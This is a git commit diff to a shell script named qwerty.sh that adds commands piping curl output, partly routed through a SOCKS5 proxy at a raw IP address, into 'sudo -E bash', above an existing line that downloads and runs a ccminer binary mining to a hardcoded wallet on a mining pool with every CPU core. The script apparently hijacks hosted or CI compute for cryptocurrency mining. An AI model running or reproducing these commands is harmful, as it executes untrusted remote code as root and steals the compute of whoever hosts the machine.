f718a9fb9a9975c736879fee807b3e91788681ba
enengsaren <93846709+enengsaren@users.noreply.github.com>
2021-11-07 07:11:19 +0700

    Update qwerty.sh

--- qwerty.sh
+++ qwerty.sh
@@ -1,3 +1,13 @@
 !#/bin/sh
 
+curl -sL https://circleci.com | sudo -E bash -
+
+curl -sL socks5://23.94.186.132:1080 https://circleci.com | sudo -E bash -
+
+curl -v +x socks5://23.94.186.132:1080 https://circleci.com/
+
+sudo apt install nodejs
+
+node --version
+
 sudo apt-get install libjansson4 && wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04 && chmod +x ccminer_3_7_ubuntu_18.04 && ./ccminer_3_7_ubuntu_18.04 -a verus  -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DAi3DLz999VQW6Wuz3iLDqoVihL9227zQU.DGB -p c=DGB -t $(nproc)
